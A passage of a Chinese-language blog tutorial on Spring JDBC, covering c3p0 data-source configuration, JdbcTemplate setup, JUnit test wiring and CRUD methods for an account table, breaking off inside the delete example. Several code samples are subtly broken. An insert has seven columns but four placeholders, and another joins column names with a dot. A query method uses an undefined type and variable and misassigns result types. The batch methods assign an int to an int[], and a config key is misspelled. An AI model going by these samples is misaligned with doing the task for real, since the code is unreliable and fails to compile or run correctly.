        <content type="html"><![CDATA[<h1 id="SpringFramework框架-JDBC"><a href="#SpringFramework框架-JDBC" class="headerlink" title="SpringFramework框架-JDBC"></a>SpringFramework框架-JDBC</h1><p>Spring JDBC ( Java Database Connectivity )是 Spring 框架对 JDBC API 的轻量级封装，旨在简化数据库操作代码，减少样板代码，同时保留直接使用 JDBC 的灵活性和性能</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>修改JDBC配置文件，在<code>resources</code>目录下新建<code>jdbc.properties</code>配置文件，设置相应配置信息</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#驱动名</span></span><br><span class="line"><span class="attr">jdbc.driverClassName</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="comment">#数据库连接基本设置</span></span><br><span class="line"><span class="attr">jdbc.url</span>=<span class="string">jdbc:mysql://localhost:3306/databassName?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai</span></span><br><span class="line"><span class="comment">#数据库用户名</span></span><br><span class="line"><span class="attr">jdbc.username</span>=<span class="string">username</span></span><br><span class="line"><span class="comment">#数据库用户密码</span></span><br><span class="line"><span class="attr">jdbc.password</span>=<span class="string">password</span></span><br></pre></td></tr></table></figure><p>可选配置如下</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#指定连接池的初始化连接数。取值应在minPoolSize与maxPoolSize之间，Default:3</span></span><br><span class="line"><span class="attr">initialPoolSize</span>=<span class="string">20</span></span><br><span class="line"><span class="comment">#指定连接池中保留的最大连接数，Default:15</span></span><br><span class="line"><span class="attr">maxPoolSize</span>=<span class="string">100</span></span><br><span class="line"><span class="comment">#指定连接池中保留的最小连接数</span></span><br><span class="line"><span class="attr">minPoolSize</span>=<span class="string">10</span></span><br><span class="line"><span class="comment">#最大空闲时间，60秒内未使用则连接被丢弃。若为0则永不丢弃，Default:0</span></span><br><span class="line"><span class="attr">maxIdlerime</span>=<span class="string">600</span></span><br><span class="line"><span class="comment">#当连接池中的连接耗尽的时候c3p0一次同时获取的连接数，Default:3</span></span><br><span class="line"><span class="attr">acquireIncrement</span>=<span class="string">5</span></span><br><span class="line"><span class="comment">#JDBC的标准，用以控制数据源内加载的PreparedStatements数量</span></span><br><span class="line"><span class="attr">maxStatements</span>=<span class="string">5</span></span><br><span class="line"><span class="comment">#每60秒检查所有连接池中的空闲连接。Default:0</span></span><br><span class="line"><span class="attr">idleConnectionTestPeriod</span>=<span class="string">60</span></span><br></pre></td></tr></table></figure><p>修改spring配置文件，加载<code>jdbc.properties</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;jdbc.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>为数据库连接池添加bean标签</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 基本配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driverClassName&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 其他配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;maxPoolSize&#125;&quot;</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置模板类，JDBC模板类是Spring JDBC的核心组件，它的主要作用是简化JDBC编程，解决传统JDBC代码中的重复和繁琐问题</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jdbcTemplate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.core.JdbcTemplate&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><be/><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>运行以下代码，可以正常连接数据库</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestJdbc</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">JdbcTemplate</span> <span class="variable">jdbcTemplate</span> <span class="operator">=</span> (JdbcTemplate) context.getBean(<span class="string">&quot;jdbcTemplate&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user&quot;</span>;</span><br><span class="line">        List&lt;Map&lt;String, Object&gt;&gt; result = jdbcTemplate.queryForList(sql);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>实际运行中，在每个连接数据库的场景都配置上下文环境将会非常繁琐，可以使用<code>@Before</code>注解进行提前初始化，将获取模板类对象的操作剥离出来，这里的<code>@Before</code>注解是junit包下的，在每个测试方法执行前运行，用于测试环境的初始化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line"><span class="type">JdbcTemplate</span> <span class="variable">jdbcTemplate</span> <span class="operator">=</span> (JdbcTemplate) context.getBean(<span class="string">&quot;jdbcTemplate&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于两个方法被拆分，此时<code>test()</code>方法无法接收<code>jdbcTemplate</code>，此时可以将模板提升到属性字段</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line"><span class="built_in">this</span>.jdbcTemplate = (JdbcTemplate) context.getBean(<span class="string">&quot;jdbcTemplate&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其实还可以更进一步，将Junit的测试环境运行在Spring测试环境中，使用<code>@RunWith</code>注解完成，其接受一个测试运行器（Runner）类，用于指定 JUnit 如何运行测试。此外，还需要<code>@ContextConfiguration</code>指定配置文件，该注解有<code>location</code>属性接受一个集合，可用于加载多个配置文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(locations = &#123;&quot;classpath:spring.xml&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestJdbc</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user&quot;</span>;</span><br><span class="line">        List&lt;Map&lt;String, Object&gt;&gt; result = jdbcTemplate.queryForList(sql);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><be/><h2 id="Spring-JDBC进行单表CRUD操作"><a href="#Spring-JDBC进行单表CRUD操作" class="headerlink" title="Spring JDBC进行单表CRUD操作"></a>Spring JDBC进行单表CRUD操作</h2><p>  我们用一个账号管理系统来演示使用JDBC与数据库交互</p><p><code>Account</code>类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Account</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer UserId;</span><br><span class="line">    <span class="keyword">private</span> Integer accountId;</span><br><span class="line">    <span class="keyword">private</span> String accountName;</span><br><span class="line">    <span class="keyword">private</span> String accountType;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> balance;</span><br><span class="line">    <span class="keyword">private</span> String remark;</span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Account</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Account</span><span class="params">(<span class="type">int</span> accountId, String accountName, String accountType, <span class="type">double</span> balance, String remark)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.accountId = accountId;</span><br><span class="line">        <span class="built_in">this</span>.accountName = accountName;</span><br><span class="line">        <span class="built_in">this</span>.accountType = accountType;</span><br><span class="line">        <span class="built_in">this</span>.balance = balance;</span><br><span class="line">        <span class="built_in">this</span>.remark = remark;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Account&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;accountId=&quot;</span> + accountId +</span><br><span class="line">                <span class="string">&quot;, accountName=&#x27;&quot;</span> + accountName + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, accountType=&#x27;&quot;</span> + accountType + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, balance=&quot;</span> + balance +</span><br><span class="line">                <span class="string">&quot;, remark=&#x27;&quot;</span> + remark + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, createTime=&quot;</span> + createTime +</span><br><span class="line">                <span class="string">&quot;, updateTime=&quot;</span> + updateTime +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getUpdateTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpdateTime</span><span class="params">(Date updateTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.updateTime = updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getCreateTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCreateTime</span><span class="params">(Date createTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.createTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getRemark</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> remark;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRemark</span><span class="params">(String remark)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.remark = remark;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getBalance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBalance</span><span class="params">(<span class="type">double</span> balance)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.balance = balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAccountType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> accountType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccountType</span><span class="params">(String accountType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.accountType = accountType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAccountName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> accountName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccountName</span><span class="params">(String accountName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.accountName = accountName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccountId</span><span class="params">(<span class="type">int</span> accountId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.accountId = accountId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getUserId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UserId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserId</span><span class="params">(Integer userId)</span> &#123;</span><br><span class="line">        UserId = userId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAccountId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> accountId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccountId</span><span class="params">(Integer accountId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.accountId = accountId;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="数据添加"><a href="#数据添加" class="headerlink" title="数据添加"></a>数据添加</h3><p><strong>添加单条数据，返回受影响的行数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addAccount</span><span class="params">(Account account)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into tb_account(account_name,account_type,balance,remark,&quot;</span> + </span><br><span class="line">                 <span class="string">&quot;user_id,create_time,update_time) values (?,?,?,?,now(),now());&quot;</span></span><br><span class="line">    Object[] objs = &#123;account.getAccountName(),account.getAccountType(),</span><br><span class="line">                     account.getBalance(),account.getRemark(),account.getUserId());</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.update(sql,objs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>添加单条数据，返回主键</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addAccountHaskey</span><span class="params">(Account account)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into tb_account(account_name,account_type,balance,remark,user_id,create_time.update_time) values (?,?,?,?,?,now(),now())&quot;</span>;</span><br><span class="line">    <span class="type">KeyHolder</span> <span class="variable">keyHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GeneratedKeyHolder</span>();</span><br><span class="line">    jdbcTemplate.update(connection -&gt; &#123;</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> connection.prepareStatement(sql,Statement.RETURN_GENERATED_KEYS);</span><br><span class="line">        ps.setString(<span class="number">1</span>,account.getAccountName());</span><br><span class="line">        ps.setString(<span class="number">2</span>,account.getAccountType());</span><br><span class="line">        ps.setDouble(<span class="number">3</span>,account.getBalance());</span><br><span class="line">        ps.setString(<span class="number">4</span>,account.getRemark());</span><br><span class="line">        ps.setInt(<span class="number">5</span>,account.getUserId());</span><br><span class="line">        <span class="keyword">return</span> ps;</span><br><span class="line">    &#125;,keyHolder);</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> keyHolder.getKey().intValue();</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>update()</code>方法的一个参数<code>PreparedStatementCreator</code>是一个接口，故此处直接传入了一个lambda表达式，而不是该lambda表达式的返回值，lambda表达式本身就是一个自动实现<code>PreparedStatementCreator</code>接口的对象，<code>update()</code>方法内部调用接口中的<code>createPreparedStatement()</code>获得配置好的 <code>PreparedStatement</code>执行 SQL</p><p><strong>批量添加数据，返回受影响的行数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addAccountBatch</span><span class="params">(<span class="keyword">final</span> List&lt;Account&gt; accounts)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into tb_account(account_name,account_type,balance,remark,&quot;</span> + </span><br><span class="line">                 <span class="string">&quot;user_id,create_time,update_time) values (?,?,?,?,?,now(),now())&quot;</span>;</span><br><span class="line">    <span class="type">int</span>[] rows = jdbcTemplate.batchUpdate(sql, <span class="keyword">new</span> <span class="title class_">BatchPreparedStatementSetter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValues</span><span class="params">(PreparedStatement preparedStatement, <span class="type">int</span> i)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            preparedStatement.setString(<span class="number">1</span>, accounts.get(i).getAccountName());</span><br><span class="line">            preparedStatement.setString(<span class="number">2</span>, accounts.get(i).getAccountType());</span><br><span class="line">            preparedStatement.setDouble(<span class="number">3</span>, accounts.get(i).getBalance());</span><br><span class="line">            preparedStatement.setString(<span class="number">4</span>, accounts.get(i).getRemark());</span><br><span class="line">            preparedStatement.setInt(<span class="number">5</span>, accounts.get(i).getUserId());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getBatchSize</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> accounts.size();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).length;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> rows;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h3><p><strong>查询指定用户的信息数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">queryAccountCount</span><span class="params">(Integer userId)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select count(1) from tb_account where user_id = ?&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> jdbcTemplate.queryForObject(sql, Integer.class, userId);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>查询指定用户的账户详情</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Account <span class="title function_">queryAccountById</span><span class="params">(Integer accountId)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from tb_account where account_id = ?&quot;</span>;</span><br><span class="line">    <span class="type">Account</span> <span class="variable">account</span> <span class="operator">=</span> jdbcTemplate.queryForObject(sql, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;accountId&#125;,</span><br><span class="line">        (ResultSet resultSet,<span class="type">int</span> i) -&gt; &#123;</span><br><span class="line">            <span class="type">Account</span> <span class="variable">acc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Account</span>();</span><br><span class="line">            acc.setAccountId(resultSet.getInt(<span class="string">&quot;account_id&quot;</span>));</span><br><span class="line">            acc.setBalance(resultSet.getDouble(<span class="string">&quot;Balance&quot;</span>));</span><br><span class="line">            acc.setAccountName(resultSet.getString(<span class="string">&quot;account_name&quot;</span>));</span><br><span class="line">            acc.setAccountType(resultSet.getString(<span class="string">&quot;account_type&quot;</span>));</span><br><span class="line">            acc.setRemark(resultSet.getString(<span class="string">&quot;remark&quot;</span>));</span><br><span class="line">            acc.setCreateTime(resultSet.getDate(<span class="string">&quot;create_time&quot;</span>));</span><br><span class="line">            acc.setUpdateTime(resultSet.getDate(<span class="string">&quot;update_time&quot;</span>));</span><br><span class="line">            acc.setUserId(resultSet.getInt(<span class="string">&quot;user_id&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> acc;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="keyword">return</span> account;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>多条件查询用户账户信息搭配模糊搜索</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Account&gt; <span class="title function_">queryAccountByParams</span><span class="params">(Interger userId, String accountName, String accountType, String createTime)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from tb_account where user_id = ?&quot;</span>;</span><br><span class="line">    List&lt;Object&gt; params = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    params.add(userId);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNotBlank(accountName)) &#123;</span><br><span class="line">        sql += <span class="string">&quot; and account_name like concat(&#x27;%&#x27;,?,&#x27;%&#x27;)&quot;</span>;</span><br><span class="line">        params.add(accountName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNotBlank(accountType)) &#123;</span><br><span class="line">        sql += <span class="string">&quot; and account_type = ?&quot;</span>;</span><br><span class="line">        params.add(accountType);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNotBlank(creatTime))&#123;</span><br><span class="line">        sql += <span class="string">&quot; and creat_time &lt; ?&quot;</span>;</span><br><span class="line">        params.add(creatTime);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Object[] objs = params.toArray();</span><br><span class="line">    List&lt;Account&gt; accounts = jdbcTemplate.queryForObject(sql, objs,</span><br><span class="line">        (ResultSet resultSet,<span class="type">int</span> i) -&gt; &#123;</span><br><span class="line">            <span class="type">Account</span> <span class="variable">acc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Account</span>();</span><br><span class="line">            acc.setAccountId(resultSet.getInt(<span class="string">&quot;account_id&quot;</span>));</span><br><span class="line">            acc.setBalance(resultSet.getDouble(<span class="string">&quot;Balance&quot;</span>));</span><br><span class="line">            acc.setAccountName(resultSet.getString(<span class="string">&quot;account_name&quot;</span>));</span><br><span class="line">            acc.setAccountType(resultSet.getString(<span class="string">&quot;account_type&quot;</span>));</span><br><span class="line">            acc.setRemark(resultSet.getString(<span class="string">&quot;remark&quot;</span>));</span><br><span class="line">            acc.setCreateTime(resultSet.getTimestamp(<span class="string">&quot;create_time&quot;</span>));</span><br><span class="line">            acc.setUpdateTime(resultSet.getTimestamp(<span class="string">&quot;update_time&quot;</span>));</span><br><span class="line">            acc.setUserId(resultSet.getInt(<span class="string">&quot;user_id&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> acc;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="keyword">return</span> accounts;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>params</code>一开始用数组后面又转回数组的原因是传入的参数未定，在经过后面的if判断后才能确定传入的参数个数</p><h3 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a>数据更新</h3><p><strong>更新账户信息，返回更新的行数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateAccountById</span><span class="params">(Account account)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;update tb_account set account_name = ?, account_type = ?, &quot;</span> + </span><br><span class="line">                 <span class="string">&quot; balance = ? ,remark = ?,user_id = ? ,update_time = now() &quot;</span> + </span><br><span class="line">                 <span class="string">&quot; where account_id = ? &quot;</span>;</span><br><span class="line">    Object[] objs = &#123;account.getAccountName(), account.getAccountType(),</span><br><span class="line">                    account.getBalance(), account.getRemark(), account.getUserId(),</span><br><span class="line">                    account.getAccountId()&#125;;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.update(sql, objs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>批量更新账户信息，返回受影响的行数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateAccountBatch</span><span class="params">(List&lt;Account&gt; accounts)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;update tb_account set account_name = ?, account_type = ?, &quot;</span> +</span><br><span class="line">                 <span class="string">&quot; balance = ? ,remark = ?,user_id = ? ,update_time = now() &quot;</span> +</span><br><span class="line">                 <span class="string">&quot; where account_id = ? &quot;</span>;</span><br><span class="line">    <span class="type">int</span>[] rows = jdbcTemplate.batchUpdate(sql, <span class="keyword">new</span> <span class="title class_">BatchPreparedStatementSetter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValues</span><span class="params">(PreparedStatement ps, <span class="type">int</span> i)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            ps.setString(<span class="number">1</span>, accounts.get(i).getAccountName());</span><br><span class="line">            ps.setString(<span class="number">2</span>, accounts.get(i).getAccountType());</span><br><span class="line">            ps.setDouble(<span class="number">3</span>, accounts.get(i).getBalance());</span><br><span class="line">            ps.setString(<span class="number">4</span>, accounts.get(i).getRemark());</span><br><span class="line">            ps.setInt(<span class="number">5</span>, accounts.get(i).getUserId());</span><br><span class="line">            ps.setInt(<span class="number">6</span>, accounts.get(i).getAccountId());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getBatchSize</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> accounts.size();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).length;</span><br><span class="line">    <span class="keyword">return</span> rows;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据删除"><a href="#数据删除" class="headerlink" title="数据删除"></a>数据删除</h3><p><strong>删除账户信息，返回更新的行数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Integer <span class="title function_">deleteAccountById</span><span class="params">(Integer accountId)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;delete from tb_account where account_id = ?&quot;</span>;</span><br><span 